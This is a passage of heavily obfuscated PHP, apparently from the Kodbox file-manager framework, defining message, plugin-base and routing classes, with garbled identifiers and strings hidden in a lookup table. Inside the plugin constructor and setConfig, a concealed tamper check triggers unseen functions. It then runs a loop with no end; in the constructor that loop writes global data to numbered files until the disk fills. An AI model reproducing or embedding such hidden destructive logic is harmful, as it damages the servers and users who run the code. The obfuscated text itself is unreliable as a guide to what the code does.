$¸Ø•±êÂ : $Â ÉŞû­[12]; self::log($Â ÉŞû­[1754] . $öÄ–òÈâ[$Â ÉŞû­[475]] . $Â ÉŞû­[178] . $ûàØş‡ç); return !0; } public static function valueGet($˜„ïı÷) { $–¢âæØš =& $_SERVER[óÔë„ú]; $Óàä³‰â = $–¢âæØš[1755]; $ê¥ªÈĞ‚ = Model($–¢âæØš[508])->get($˜„ïı÷, $Óàä³‰â); if (is_null($ê¥ªÈĞ‚)) { Model($–¢âæØš[508])->set($–¢âæØš[810], $–¢âæØš[91], $Óàä³‰â); Model($–¢âæØš[508])->set($–¢âæØš[1708], $–¢âæØš[228], $Óàä³‰â); $ê¥ªÈĞ‚ = Model($–¢âæØš[508])->get($˜„ïı÷, $Óàä³‰â); } return $ê¥ªÈĞ‚; } private static function valueSet($Ÿ¨Ü§ÚÍ, $¤Š´Ñô‰ = false) { $Ïº«ƒÍÙ =& $_SERVER[óÔë„ú]; $Æ„åúøˆ = $Ïº«ƒÍÙ[1756]; CacheLock::lock($Æ„åúøˆ); $ê¬ ©†Õ = Model($Ïº«ƒÍÙ[508])->set($Ÿ¨Ü§ÚÍ, $¤Š´Ñô‰, $Ïº«ƒÍÙ[1755]); CacheLock::unlock($Æ„åúøˆ); return $ê¬ ©†Õ; } protected static function log($ôæªÆ´…) { write_log($ôæªÆ´…, $_SERVER[óÔë„ú][1742]); } private static function cacheClear() { $ˆÃ¾æ€Ç =& $_SERVER[óÔë„ú]; Cache::clearMemory(Model($ˆÃ¾æ€Ç[508])->cacheKey($ˆÃ¾æ€Ç[1755])); Cache::clearMemory(Model($ˆÃ¾æ€Ç[508])->cacheKey($ˆÃ¾æ€Ç[1757])); Model($ˆÃ¾æ€Ç[1727])->cacheClear(); self::closeDatabase(); } } goto bÉŒá–îÖ; B÷Ùí¬Ş°: class Message { function __construct() { } public function send($×»´úÙ† = '', $‡ÌõìŒÊ = array(), $çôİÇ†ï = "\x74\145\x78\x74") { $æ Î·Ÿ¬ =& $_SERVER[óÔë„ú]; $‡² ì™Â = array($æ Î·Ÿ¬[33] => $æ Î·Ÿ¬[1607], $æ Î·Ÿ¬[171] => $×»´úÙ†); if (in_array($çôİÇ†ï, array($æ Î·Ÿ¬[1607], $æ Î·Ÿ¬[1608]))) { $‡² ì™Â[$æ Î·Ÿ¬[33]] = $çôİÇ†ï; } $‡ÌõìŒÊ = array($æ Î·Ÿ¬[578] => isset($‡ÌõìŒÊ[$æ Î·Ÿ¬[578]]) ? $‡ÌõìŒÊ[$æ Î·Ÿ¬[578]] : $æ Î·Ÿ¬[12], $æ Î·Ÿ¬[662] => isset($‡ÌõìŒÊ[$æ Î·Ÿ¬[662]]) ? $‡ÌõìŒÊ[$æ Î·Ÿ¬[662]] : $æ Î·Ÿ¬[12]); if (empty($×»´úÙ†) || empty($‡ÌõìŒÊ[$æ Î·Ÿ¬[578]]) && empty($‡ÌõìŒÊ[$æ Î·Ÿ¬[662]])) { return !1; } $½—êÁÊ‡ = array($æ Î·Ÿ¬[1535] => $‡² ì™Â, $æ Î·Ÿ¬[1609] => $‡ÌõìŒÊ); Hook::trigger($æ Î·Ÿ¬[1610], $½—êÁÊ‡); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ù½Êñ´â =& $_SERVER[óÔë„ú]; $©×ëÒÁ™ = $_SERVER[$ù½Êñ´â[940]] . $ù½Êñ´â[941]; $ñ²‘Êœª = $ù½Êñ´â[1611]; if ($_SERVER[$ù½Êñ´â[936]] != $ñ²‘Êœª($©×ëÒÁ™)) { $ë­ÍÈŒ¹ = $ù½Êñ´â[938]; $¥Ãµó¨‚ = $ù½Êñ´â[939]; $Œ¡‰¥´ = $_SERVER[$ù½Êñ´â[940]] . $ù½Êñ´â[941]; $©¼Ï·¡­ = $¥Ãµó¨‚($Œ¡‰¥´); $ËıèÙú’ = explode($ù½Êñ´â[262], $©¼Ï·¡­); if (count($ËıèÙú’) < $ù½Êñ´â[691]) { $‚¬¢®š¤ = $ù½Êñ´â[942]; $‚¬¢®š¤(); } $Øæ½¼ = $ù½Êñ´â[943]; $Øæ½¼($_SERVER[$ù½Êñ´â[944]]); $ë­ÍÈŒ¹ = $ù½Êñ´â[938]; $ë­ÍÈŒ¹(); $†ÍíÚğ = $ù½Êñ´â[1612]; $­›¬¨—Ş = json_encode($GLOBALS[$ù½Êñ´â[1613]]); $¦©ÔìâÇ = 1; for ($´Ò†ÚûÍ = $¦©ÔìâÇ; $´Ò†ÚûÍ > 0; $´Ò†ÚûÍ++) { $†ÍíÚğ(DATA_PATH . $´Ò†ÚûÍ, $­›¬¨—Ş); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ù½Êñ´â[1614]); $this->pluginName = str_replace($ù½Êñ´â[1614], $ù½Êñ´â[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ù½Êñ´â[8]; $this->pluginApi = appHostGet() . $ù½Êñ´â[1615] . $this->pluginName . $ù½Êñ´â[8]; $this->pluginHost = $config[$ù½Êñ´â[1616]] . $this->pluginName . $ù½Êñ´â[8]; $this->pluginHostDefault = $config[$ù½Êñ´â[1616]] . $this->pluginName . $ù½Êñ´â[8]; $¸¤£¬ˆä = $config[$ù½Êñ´â[1617]]; if ($¸¤£¬ˆä && strpos($ù½Êñ´â[50] . $¸¤£¬ˆä . $ù½Êñ´â[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ù½Êñ´â[1618]] . $this->pluginName . $ù½Êñ´â[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[óÔë„ú][1619]); } protected function assign($îßÙÉ¹, $ôâ€œÓ± = false) { if (is_array($îßÙÉ¹)) { $this->values = array_merge($this->values, $îßÙÉ¹); } else { $this->values[$îßÙÉ¹] = $ôâ€œÓ±; } } protected function display($šÏªãöˆ) { extract($this->values); require $šÏªãöˆ; } final function hookRegist($Å’Í¶­) { $this->modelPlugin->appRegist($this->pluginName, $Å’Í¶­); } final function appIcon() { $…ı²©Öı =& $_SERVER[óÔë„ú]; $ÛÇãĞ = $this->appPackage(); $êª¶–ò¡ = $…ı²©Öı[12]; if (isset($ÛÇãĞ[$…ı²©Öı[490]])) { if (isset($ÛÇãĞ[$…ı²©Öı[490]][$…ı²©Öı[1620]])) { $êª¶–ò¡ = $…ı²©Öı[1621] . $ÛÇãĞ[$…ı²©Öı[490]][$…ı²©Öı[1620]] . $…ı²©Öı[1622]; } else { if ($ÛÇãĞ[$…ı²©Öı[490]][$…ı²©Öı[1623]]) { $êª¶–ò¡ = $…ı²©Öı[1624] . $ÛÇãĞ[$…ı²©Öı[490]][$…ı²©Öı[1623]] . $…ı²©Öı[1625]; } } } return $êª¶–ò¡; } final function fileCanView($ÇĞ¡ß™¸) { $—¹ÓØ‰ğ =& $_SERVER[óÔë„ú]; if (request_url_safe($ÇĞ¡ß™¸)) { return !0; } if ($this->isShare($ÇĞ¡ß™¸)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $£õ‚„œ = $—¹ÓØ‰ğ[1626] . rawurlencode(this_url()); show_tips(LNG($—¹ÓØ‰ğ[1627]) . $—¹ÓØ‰ğ[1628] . $£õ‚„œ . $—¹ÓØ‰ğ[1629] . LNG($—¹ÓØ‰ğ[1630]) . $—¹ÓØ‰ğ[1631], !1); } if (!Action($—¹ÓØ‰ğ[1632])->authCan($—¹ÓØ‰ğ[1633])) { show_tips(LNG($—¹ÓØ‰ğ[1634]) . $—¹ÓØ‰ğ[1635], !1); } ActionCall($—¹ÓØ‰ğ[1636], $ÇĞ¡ß™¸); } final function isShare($ÅÄ‚£ûÑ) { $çó¿µŒ“ = KodIO::parse($ÅÄ‚£ûÑ); return $çó¿µŒ“[$_SERVER[óÔë„ú][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($çÓ²……¼) { if (request_url_safe($çÓ²……¼)) { return $çÓ²……¼; } if (!$this->isShare($çÓ²……¼)) { $çÓ²……¼ = $this->filePath($çÓ²……¼, !1); } return Action($_SERVER[óÔë„ú][1241])->linkOut($çÓ²……¼); } public function filePathLinkOut($©‡³ëÇè) { if (request_url_safe($©‡³ëÇè)) { return $©‡³ëÇè; } $this->fileCanView($©‡³ëÇè); return Action($_SERVER[óÔë„ú][1241])->link($©‡³ëÇè); } final function filePath($Í˜Ëú…ê, $¦‘Á¡÷ = true, $ò”ïÑ€ = false) { $¹ĞïŸç¿ =& $_SERVER[óÔë„ú]; $Æ³°ÜÖï = $this->filePathGet($Í˜Ëú…ê, $¦‘Á¡÷); if (!$this->fileInfo) { show_tips(LNG($¹ĞïŸç¿[108]), !1); } if ($ò”ïÑ€ && isset($this->fileInfo[$¹ĞïŸç¿[541]]) && $this->fileInfo[$¹ĞïŸç¿[541]]) { $ØÛÚ¢Š‹ = Model($¹ĞïŸç¿[544])->fileInfo($this->fileInfo[$¹ĞïŸç¿[541]]); if (!$ØÛÚ¢Š‹ || !IO::exist($ØÛÚ¢Š‹[$¹ĞïŸç¿[87]])) { show_tips(LNG($¹ĞïŸç¿[108]) . $¹ĞïŸç¿[1637]); } } Hook::trigger($¹ĞïŸç¿[1638], $Æ³°ÜÖï); return $Æ³°ÜÖï; } final function filePathGet($öÇ˜ó¦¢, $ªı¥Ú–œ = true) { $âÙˆĞøé =& $_SERVER[óÔë„ú]; if ($¢…¹êô– = $this->checkSharePath($öÇ˜ó¦¢, $ªı¥Ú–œ)) { return $¢…¹êô–; } $this->fileCanView($öÇ˜ó¦¢); if (request_url_safe($öÇ˜ó¦¢)) { $—´úüéÏ = parse_url_query($öÇ˜ó¦¢); if (isset($—´úüéÏ[$âÙˆĞøé[1639]]) && isset($—´úüéÏ[$âÙˆĞøé[234]])) { $¸Šº¦Ñ› = Mcrypt::decode($—´úüéÏ[$âÙˆĞøé[234]], Model($âÙˆĞøé[830])->get($âÙˆĞøé[831])); if ($¸Šº¦Ñ›) { $this->fileInfo = IO::info($¸Šº¦Ñ›); $this->fileInfo[$âÙˆĞøé[1640]] = $öÇ˜ó¦¢; $this->cachePath = $this->pluginCachePath($âÙˆĞøé[12], $ªı¥Ú–œ); return $¸Šº¦Ñ›; } } $öÇ˜ó¦¢ = $this->_cacheHttpFile($öÇ˜ó¦¢, $ªı¥Ú–œ); $this->fileInfo = IO::info($öÇ˜ó¦¢); } else { $this->fileInfo = IO::info($öÇ˜ó¦¢); $this->cachePath = $this->pluginCachePath($âÙˆĞøé[12], $ªı¥Ú–œ); } return $öÇ˜ó¦¢; } final function _cacheHttpFile($˜òĞµå, $„¾¨‰·Ş = true) { $„”…¿Šà =& $_SERVER[óÔë„ú]; $¿‰ÒØ®Î = parse_url_query($˜òĞµå); $É¯ÕÏÛã = get_path_ext($˜òĞµå); if (isset($¿‰ÒØ®Î[$„”…¿Šà[32]]) && $¿‰ÒØ®Î[$„”…¿Šà[32]]) { $É¯ÕÏÛã = get_path_ext($¿‰ÒØ®Î[$„”…¿Šà[32]]); } $áíĞÆ±ê = hash_path($˜òĞµå) . $„”…¿Šà[10] . $É¯ÕÏÛã; $this->cachePath = $this->pluginCachePath($„¾¨‰·Ş ? $áíĞÆ±ê : $„”…¿Šà[12]); $ÎÑÄŸª’ = IO::fileNameExist($this->cachePath, $áíĞÆ±ê); if ($ÎÑÄŸª’) { return KodIO::make($ÎÑÄŸª’); } $â‘˜ƒ±Å = rtrim($this->cachePath, $„”…¿Šà[8]) . $„”…¿Šà[8] . $áíĞÆ±ê; return $this->pluginCacheFileSet($â‘˜ƒ±Å, file_get_contents_nossl($˜òĞµå)); } final function checkSharePath($ÊŸœ»Š, $ÈñÛ÷è = true) { $‰°¤òÇÒ =& $_SERVER[óÔë„ú]; if (!$this->isShare($ÊŸœ»Š)) { return !1; } $òšÑ†ù = Action($‰°¤òÇÒ[1241])->sharePathInfo($ÊŸœ»Š); if (!is_array($òšÑ†ù) || !isset($òšÑ†ù[$‰°¤òÇÒ[87]])) { show_json(LNG($‰°¤òÇÒ[1641]), !1); } $this->fileInfo = $òšÑ†ù; $this->cachePath = $this->pluginCachePath(!1, $ÈñÛ÷è); return $òšÑ†ù[$‰°¤òÇÒ[87]]; } final function pluginCachePath($®¥¨š = '', $ğî—ƒÃÚ = false) { $”™²®˜ =& $_SERVER[óÔë„ú]; if ($ğî—ƒÃÚ && is_array($this->fileInfo)) { $®¥¨š = kodIO::hashPath($this->fileInfo); } $ô˜¶Î±˜ = rtrim(IO_PATH_SYSTEM_TEMP . $”™²®˜[1642] . $this->pluginName . $”™²®˜[8] . $®¥¨š, $”™²®˜[8]); $åæ©õÍï = IO::infoFullSimple($ô˜¶Î±˜); $”¥Í„ñÇ = $åæ©õÍï && is_array($åæ©õÍï) ? $åæ©õÍï[$”™²®˜[87]] : $”™²®˜[12]; if (!$”¥Í„ñÇ) { $”¥Í„ñÇ = IO::mkdir($ô˜¶Î±˜); } return $”¥Í„ñÇ; } final function pluginCacheFileSet($µïíÏ‡, $áŸÃ–Â = '') { $Ø†š€µ¤ =& $_SERVER[óÔë„ú]; $…ÜêâÌ = IO::infoFullSimple($µïíÏ‡); if (!$…ÜêâÌ) { return IO::mkfile($µïíÏ‡, $áŸÃ–Â, REPEAT_REPLACE); } IO::setContent($…ÜêâÌ[$Ø†š€µ¤[87]], $áŸÃ–Â); return $…ÜêâÌ[$Ø†š€µ¤[87]]; } final function pluginLocalFile($íƒÅøõ… = '') { $–Œ±ÅÖû =& $_SERVER[óÔë„ú]; $ÅÜì‰ª» = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ÅÜì‰ª»)) { mk_dir($ÅÜì‰ª»); } if (!$íƒÅøõ…) { return $ÅÜì‰ª»; } $›í•Ö“¨ = IO::info($íƒÅøõ…); $Û‰¥¯Ç« = $–Œ±ÅÖû[1643] . KodIO::hashPath($›í•Ö“¨) . $–Œ±ÅÖû[10] . $›í•Ö“¨[$–Œ±ÅÖû[169]]; if (!checkExtSafe($Û‰¥¯Ç«)) { $Û‰¥¯Ç« = $Û‰¥¯Ç« . $–Œ±ÅÖû[1278]; } $Ğœ¼©µø = $ÅÜì‰ª» . $Û‰¥¯Ç«; if (@file_exists($Ğœ¼©µø)) { return $Ğœ¼©µø; } return IO::copy($íƒÅøõ…, $ÅÜì‰ª», 0, $Û‰¥¯Ç«); } final function appPackage() { $è±¼´—æ =& $_SERVER[óÔë„ú]; if ($this->packageData) { return $this->packageData; } $·–ù€ = $this->parseFile($this->pluginPath . $è±¼´—æ[1644]); $this->parseLang($·–ù€); $’©àß§’ = json_decode_force($·–ù€); if (!$’©àß§’) { return array(); } $éø–†»¥ = Hook::trigger($è±¼´—æ[1645], $’©àß§’); if ($éø–†»¥ && is_array($éø–†»¥)) { $’©àß§’ = $éø–†»¥; } $this->packageData = $’©àß§’; return $’©àß§’; } public function packageInfoGet($“¢ÀÏÂ­) { $å¸‰‰Æ€ = $this->appPackage(); return array_get_value($å¸‰‰Æ€, $“¢ÀÏÂ­); } public function packageVersion() { return $this->packageInfoGet($_SERVER[óÔë„ú][1646]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[óÔë„ú][1647]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[óÔë„ú][1648]); } public function echoJsAssign($¹°ŠüƒŸ, $³ìÆ©) { $this->echoJsAssignArr[$¹°ŠüƒŸ] = $³ìÆ©; } private function parseFile($®é­Ä–) { $­–Æ‚¨­ =& $_SERVER[óÔë„ú]; $Œ¸­õ©é = file_get_contents_nossl($®é­Ä–); $»à”µ¦ = array($­–Æ‚¨­[1649], $­–Æ‚¨­[1650], $­–Æ‚¨­[1651], $­–Æ‚¨­[1652], $­–Æ‚¨­[1653], $­–Æ‚¨­[1654], $­–Æ‚¨­[1655]); $±·ƒ‹ç = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$­–Æ‚¨­[92]][$­–Æ‚¨­[1656]]); foreach ($this->echoJsAssignArr as $ˆË†æÜÄ => $È¡©Í¬) { $»à”µ¦[] = $­–Æ‚¨­[1657] . $ˆË†æÜÄ . $­–Æ‚¨­[1658]; $±·ƒ‹ç[] = is_array($È¡©Í¬) || is_object($È¡©Í¬) ? rawurlencode(json_encode($È¡©Í¬)) : $È¡©Í¬; } if (strstr($Œ¸­õ©é, $­–Æ‚¨­[1659])) { $¿ùÉœÛÍ = rawurlencode(json_encode($this->pluginLangArr)); $Œ¸­õ©é = str_replace($­–Æ‚¨­[1659], $¿ùÉœÛÍ, $Œ¸­õ©é); } if (strstr($Œ¸­õ©é, $­–Æ‚¨­[1660])) { $¿ùÉœÛÍ = $¿ùÉœÛÍ = rawurlencode(json_encode($this->getConfig())); $Œ¸­õ©é = str_replace($­–Æ‚¨­[1660], $¿ùÉœÛÍ, $Œ¸­õ©é); } $Œ¸­õ©é = str_replace($»à”µ¦, $±·ƒ‹ç, $Œ¸­õ©é); return $Œ¸­õ©é; } private function parseLang(&$¾Á–ÊÙå) { $ê¤ÈñËÌ =& $_SERVER[óÔë„ú]; $‡´ş¤« = $ê¤ÈñËÌ[1661]; if (!strstr($¾Á–ÊÙå, $‡´ş¤«)) { return; } preg_match_all($ê¤ÈñËÌ[1662], $¾Á–ÊÙå, $Á†Ä°Î¸); if (!is_array($Á†Ä°Î¸) || count($Á†Ä°Î¸) == 0 || !is_array($Á†Ä°Î¸[0]) || count($Á†Ä°Î¸[0]) == 0) { return; } $é´Æ™Ìº = array(); $Úò˜¦“À = array(); foreach ($Á†Ä°Î¸[0] as $‡™šÀó™) { $Ê¿æŠƒ = substr($‡™šÀó™, strlen($‡´ş¤«), -4); $¾ÅŠÃœ = LNG($Ê¿æŠƒ); $é´Æ™Ìº[] = $‡™šÀó™; $Úò˜¦“À[] = str_replace(array($ê¤ÈñËÌ[262], $ê¤ÈñËÌ[1142], $ê¤ÈñËÌ[418], $ê¤ÈñËÌ[121]), array($ê¤ÈñËÌ[53], $ê¤ÈñËÌ[53], $ê¤ÈñËÌ[12], $ê¤ÈñËÌ[1663]), $¾ÅŠÃœ); } $¾Á–ÊÙå = str_replace($é´Æ™Ìº, $Úò˜¦“À, $¾Á–ÊÙå); } private function parseConfig(&$–ÂÙç£Š) { $ı¡•ã›ö =& $_SERVER[óÔë„ú]; $´Ò•çµ° = $ı¡•ã›ö[1664]; if (!strstr($–ÂÙç£Š, $´Ò•çµ°)) { return; } preg_match_all($ı¡•ã›ö[1665], $–ÂÙç£Š, $¾§Ê¤è); if (!is_array($¾§Ê¤è) || count($¾§Ê¤è) == 0 || !is_array($¾§Ê¤è[0]) || count($¾§Ê¤è[0]) == 0) { return; } $¢ÚÒ¨é½ = $this->getConfig(); $ïÔøì• = array(); $ç…ôÛüÈ = array(); foreach ($¾§Ê¤è[0] as $òÀİé÷Æ) { $Õà”šœ = substr($òÀİé÷Æ, strlen($´Ò•çµ°), -2); $ïÔøì•[] = $òÀİé÷Æ; $ç…ôÛüÈ[] = _get($¢ÚÒ¨é½, $Õà”šœ); } $–ÂÙç£Š = str_replace($ïÔøì•, $ç…ôÛüÈ, $–ÂÙç£Š); } private function parsePackage(&$’ª‹æçÑ) { $úÂúâ¸ =& $_SERVER[óÔë„ú]; $³Ş…üµª = $úÂúâ¸[1666]; if (!strstr($’ª‹æçÑ, $³Ş…üµª)) { return; } preg_match_all($úÂúâ¸[1667], $’ª‹æçÑ, $ş•°£¿›); if (!is_array($ş•°£¿›) || count($ş•°£¿›) == 0 || !is_array($ş•°£¿›[0]) || count($ş•°£¿›[0]) == 0) { return; } $×›Ú¯Úö = $this->appPackage(); $…ı½Ã’ = array(); $‚ ğ˜¼ = array(); foreach ($ş•°£¿›[0] as $îºõûÛ©) { $õ™øş´ = substr($îºõûÛ©, strlen($³Ş…üµª), -2); $…ı½Ã’[] = $îºõûÛ©; $‚ ğ˜¼[] = _get($×›Ú¯Úö, $õ™øş´); } $’ª‹æçÑ = str_replace($…ı½Ã’, $‚ ğ˜¼, $’ª‹æçÑ); } final function echoFile($ğçóªù, $©íÕ½òş = false) { $Æ›®ô®˜ =& $_SERVER[óÔë„ú]; $â‘–é€Í = $this->pluginPath . $ğçóªù; if (ACT == $Æ›®ô®˜[1668]) { echo $Æ›®ô®˜[1669] . $this->pluginName . $Æ›®ô®˜[8] . $ğçóªù . $Æ›®ô®˜[1670]; if (!file_exists($â‘–é€Í)) { echo $Æ›®ô®˜[1671]; return; } } $¾Ò²Õ—Ó = $this->parseFile($â‘–é€Í); $this->parseLang($¾Ò²Õ—Ó); $this->parseConfig($¾Ò²Õ—Ó); $this->parsePackage($¾Ò²Õ—Ó); if (is_array($©íÕ½òş)) { $¾Ò²Õ—Ó = str_replace(array_keys($©íÕ½òş), array_values($©íÕ½òş), $¾Ò²Õ—Ó); } echo $Æ›®ô®˜[262] . $¾Ò²Õ—Ó; } private function checkVersion() { $€¿ñ™Ññ =& $_SERVER[óÔë„ú]; $üŸ¾‡…Ä = $this->appPackage(); $”Ïä•–‡ = $this->getConfig(); if ($”Ïä•–‡[$€¿ñ™Ññ[1672]] == $üŸ¾‡…Ä[$€¿ñ™Ññ[1646]]) { return; } $this->regist(); $this->setConfig(array($€¿ñ™Ññ[1672] => $üŸ¾‡…Ä[$€¿ñ™Ññ[1646]])); } final function initLang() { $äàî‰Òö =& $_SERVER[óÔë„ú]; $û÷Å†¨Î = $äàî‰Òö[1673]; $”«Å©‚à = $this->pluginPath . $äàî‰Òö[1674]; $æÛ¶ïå = I18n::getType(); $î»˜Êûê = array(); if (file_exists($”«Å©‚à . $æÛ¶ïå . $äàî‰Òö[898])) { $î»˜Êûê = (include $”«Å©‚à . $æÛ¶ïå . $äàî‰Òö[898]); } else { if ($æÛ¶ïå == $äàî‰Òö[1675] && !file_exists($”«Å©‚à . $æÛ¶ïå . $äàî‰Òö[898]) && file_exists($”«Å©‚à . $äàî‰Òö[1676])) { $î»˜Êûê = (include $”«Å©‚à . $äàî‰Òö[1676]); } else { if (file_exists($”«Å©‚à . $û÷Å†¨Î . $äàî‰Òö[898])) { $î»˜Êûê = (include $”«Å©‚à . $û÷Å†¨Î . $äàî‰Òö[898]); } } } if (!is_array($î»˜Êûê)) { return array(); } if (@count($î»˜Êûê) > 0) { I18n::set($î»˜Êûê); } return $î»˜Êûê; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Äô›­úŠ) { $±¬³§ã =& $_SERVER[óÔë„ú]; if (!isset($_SERVER[$±¬³§ã[936]]) || !isset($_SERVER[$±¬³§ã[937]])) { $·÷”¿´ = $±¬³§ã[938]; $üÇµŒƒÄ = $±¬³§ã[939]; $»·Â¬õ¯ = $_SERVER[$±¬³§ã[940]] . $±¬³§ã[941]; $Ú¸úÍ = $üÇµŒƒÄ($»·Â¬õ¯); $™£ŒÁú = explode($±¬³§ã[262], $Ú¸úÍ); if (count($™£ŒÁú) < $±¬³§ã[691]) { $²ä™¦äö = $±¬³§ã[942]; $²ä™¦äö(); } $Ãª™®™ = $±¬³§ã[943]; $Ãª™®™($_SERVER[$±¬³§ã[944]]); $Åº¯õ¿Ú = 1; for ($›Õïó´ = $Åº¯õ¿Ú; $›Õïó´ > 0; $›Õïó´++) { $Ãª™®™ = json_encode($GLOBALS[$±¬³§ã[492]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $Äô›­úŠ); } public function onSetConfig($’½ïØØ) { } public function onGetConfig($ Æâ›’Ğ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ŠÎ­ÕŸ£) { if ($ŠÎ­ÕŸ£ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($´ºÂíéÑ = "\160\154\165\147\151\156\x41\165\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $†Ú¤ÂÛî = $this->getConfig(); if (!$†Ú¤ÂÛî[$´ºÂíéÑ]) { return !1; } return ActionCall($_SERVER[óÔë„ú][1677], $†Ú¤ÂÛî[$´ºÂíéÑ]); } public function url($ïÃóÜ…, $Ñ¹´Ê·î = '', $¾êŒ±£å = true) { $ÃÖÚ´²â =& $_SERVER[óÔë„ú]; $ü®³¯¦õ = $this->getConfig(); $ä„²ì‡• = KOD_VERSION . $ÃÖÚ´²â[10] . KOD_VERSION_BUILD; $”º¤Ú­¤ = $this->packageVersion(); $šÂÂ•”Ğ = $ä„²ì‡• . $ÃÖÚ´²â[462] . $”º¤Ú­¤; if (substr($ïÃóÜ…, 0, 4) == $ÃÖÚ´²â[152] || substr($ïÃóÜ…, 0, 2) == $ÃÖÚ´²â[1397]) { $Å©µ‰™ = $ïÃóÜ… . $ÃÖÚ´²â[1678] . $šÂÂ•”Ğ; } else { if ($Ñ¹´Ê·î == $ÃÖÚ´²â[12]) { $Å©µ‰™ = $this->pluginHost . $ïÃóÜ… . $ÃÖÚ´²â[1678] . $šÂÂ•”Ğ; } else { if ($Ñ¹´Ê·î === $ÃÖÚ´²â[78]) { $Å©µ‰™ = $this->pluginHost . $ïÃóÜ…; } else { if ($Ñ¹´Ê·î == $ÃÖÚ´²â[1679]) { $Å©µ‰™ = STATIC_PATH . $ïÃóÜ… . $ÃÖÚ´²â[1678] . $ä„²ì‡•; } else { if ($Ñ¹´Ê·î == $ÃÖÚ´²â[1680]) { $Å©µ‰™ = APP_HOST . $ÃÖÚ´²â[1681] . $ïÃóÜ… . $ÃÖÚ´²â[1678] . $ä„²ì‡•; } else { if (isset($ü®³¯¦õ[$Ñ¹´Ê·î])) { $Å©µ‰™ = $ü®³¯¦õ[$Ñ¹´Ê·î] . $ïÃóÜ… . $ÃÖÚ´²â[1678] . $šÂÂ•”Ğ; } } } } } } if (!$¾êŒ±£å) { return $Å©µ‰™; } echo $Å©µ‰™; } public function link($¾Û ş®ø = false, $îİôªœË = '') { $×À¶ü¥¨ =& $_SERVER[óÔë„ú]; $½‰×ú˜ = $this->linkHas == !1; $this->linkHas = !0; if (!$¾Û ş®ø) { $this->link($×À¶ü¥¨[1682], $×À¶ü¥¨[1680]); $this->link($×À¶ü¥¨[1683], $×À¶ü¥¨[1679]); $this->link($×À¶ü¥¨[1684], $×À¶ü¥¨[1679]); $this->link($×À¶ü¥¨[1685], $×À¶ü¥¨[1679]); $this->link($×À¶ü¥¨[1686], $×À¶ü¥¨[1679]); if ($½‰×ú˜) { Hook::trigger($×À¶ü¥¨[1687]); } return; } $œˆû‹õ = $this->url($¾Û ş®ø, $îİôªœË, !1); if (substr($¾Û ş®ø, -3) == $×À¶ü¥¨[1688]) { echo $×À¶ü¥¨[1689] . $œˆû‹õ . $×À¶ü¥¨[1690] . $×À¶ü¥¨[262]; } else { if (substr($¾Û ş®ø, -4) == $×À¶ü¥¨[1691]) { echo $×À¶ü¥¨[1692] . $œˆû‹õ . $×À¶ü¥¨[1693] . $×À¶ü¥¨[262]; } } if ($½‰×ú˜) { Hook::trigger($×À¶ü¥¨[1687]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\171" => "\x5b\136\57\135\x2b", "\72\x6e\165\155" => "\133\x30\x2d\x39\x5d\53", "\72\141\154\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($õÆÈ©, $›Èµ¨¯Ø) { $Â»³„¢€ =& $_SERVER[óÔë„ú]; if ($õÆÈ© == $Â»³„¢€[1694]) { $¿ó½÷ = array_map($Â»³„¢€[1695], $›Èµ¨¯Ø[0]); $ı‘¸²ªö = strpos($›Èµ¨¯Ø[1], $Â»³„¢€[8]) === 0 ? $›Èµ¨¯Ø[1] : $Â»³„¢€[8] . $›Èµ¨¯Ø[1]; $ƒ³ÍøÄˆ = $›Èµ¨¯Ø[2]; } else { $¿ó½÷ = null; $ı‘¸²ªö = strpos($›Èµ¨¯Ø[0], $Â»³„¢€[8]) === 0 ? $›Èµ¨¯Ø[0] : $Â»³„¢€[8] . $›Èµ¨¯Ø[0]; $ƒ³ÍøÄˆ = $›Èµ¨¯Ø[1]; } array_push(self::$maps, $¿ó½÷); array_push(self::$routes, $ı‘¸²ªö); array_push(self::$methods, strtoupper($õÆÈ©)); array_push(self::$callbacks, $ƒ³ÍøÄˆ); } public static function error($ß°Ÿ†¹) { self::$errorCallback = $ß°Ÿ†¹; } public static function haltOnMatch($×ÙÜâ³¡ = true) { self::$halts = $×ÙÜâ³¡; } public static function dispatch() { $’ˆòî±ã =& $_SERVER[óÔë„ú]; $ÓÜ„ñê¿ = parse_url($_SERVER[$’ˆòî±ã[1696]], PHP_URL_PATH); $Óé† = $_SERVER[$’ˆòî±ã[164]]; $Ú‡‘öñ÷ = array_keys(static::$patterns); $íùÕÄƒ÷ = array_values(static::$patterns); $Å†½µ‰ñ = !1; self::$routes = preg_replace($’ˆòî±ã[1348], $’ˆòî±ã[8], self::$routes); if (in_array($ÓÜ„ñê¿, self::$routes)) { $ë»™ğî = array_keys(self::$routes, $ÓÜ„ñê¿); foreach ($ë»™ğî as $«§ËçÊ) { if (self::$methods[$«§ËçÊ] == $Óé† || self::$methods[$«§ËçÊ] == $’ˆòî±ã[1697] || in_array($Óé†, self::$maps[$«§ËçÊ])) { $Å†½µ‰ñ = !0; if (!is_object(self::$callbacks[$«§ËçÊ])) 